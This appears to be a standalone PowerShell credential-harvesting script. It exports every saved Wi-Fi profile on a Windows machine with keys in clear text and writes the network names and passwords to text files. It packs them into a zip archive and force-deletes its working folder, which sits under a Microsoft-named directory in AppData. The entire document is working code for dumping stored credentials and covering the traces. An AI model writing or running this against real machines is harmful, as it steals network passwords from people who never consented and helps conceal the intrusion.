param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir wifi_data ; Set-Location wifi_data

netsh wlan export profile key=clear
dir *.xml |% {
    $xml=[xml] (get-content $_)
    $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
    Out-File wifipass.txt -Append -InputObject $a
    }
  
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > .\wifipass2.txt

Set-Location ..
Compress-Archive -Path * -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\wifi_data" -recurse -Force